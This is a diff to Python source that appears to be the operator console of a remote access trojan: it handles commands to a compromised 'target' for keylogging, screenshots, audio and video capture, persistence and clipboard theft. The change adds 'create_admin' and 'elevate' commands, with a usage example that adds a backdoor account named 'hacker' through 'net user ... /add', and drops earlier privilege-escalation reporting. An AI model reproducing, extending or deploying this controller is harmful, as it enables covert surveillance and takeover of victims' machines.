@@ -149,14 +149,12 @@ def target_communication():
                 print(f"Keylog Data:\n{'-'*40}")
                 print(result)
                 print("-"*40)
-        elif command in ['screenshot', 'start_audio', 'stop_audio', 'staaudio', 'stop_audio', 'start_video', 'stop_video', 'start_rt_video', 'stop_video', 'start_recording', 'stop_recording', 'recording_status', 'list_recordings']:
+        elif command in ['screenshot', 'start_audio', 'stop_audio', 'start_video', 'stop_video', 'list_recordings']:
             # Handle recording commands
             result = reliable_recv()
             if command == 'screenshot':
                 if isinstance(result, dict) and result.get('action') == 'screenshot':
                     # Save screenshot to server
-                    
-                    
                     # Create recordings directory if it doesn't exist
                     recordings_dir = "recordings"
                     if not os.path.exists(recordings_dir):
@@ -213,19 +211,17 @@ def target_communication():
             result = reliable_recv()
             if command == 'start_persistence':
                 print(f"Persistence: {result}")
-        elif command in ['check_privs', 'escalate', 'privesc_report']:
-            # Handle privilege escalation commands
+        elif command.startswith('create_admin'):
             result = reliable_recv()
-            if command == 'check_privs':
-                print(f"Privileges: {result}")
-            elif command == 'escalate':
-                print(f"Escalation Result:\n{'-'*40}")
+            print(result)
+        elif command.startswith('elevate '):
+            # Handle elevated command execution
+            if len(command) > 8:
+                result = reliable_recv()
                 print(result)
-                print("-"*40)
-            elif command == 'privesc_report':
-                print(f"Privilege Report:\n{'-'*40}")
-                print(result)
-                print("-"*40)
+            else:
+                print("Usage: elevate <command>")
+                print("Example: elevate net user hacker P@ss123! /add")
         elif command in ['start_clipboard', 'stop_clipboard', 'clipboard_history']:
             result = reliable_recv()
             if command == 'start_clipboard':
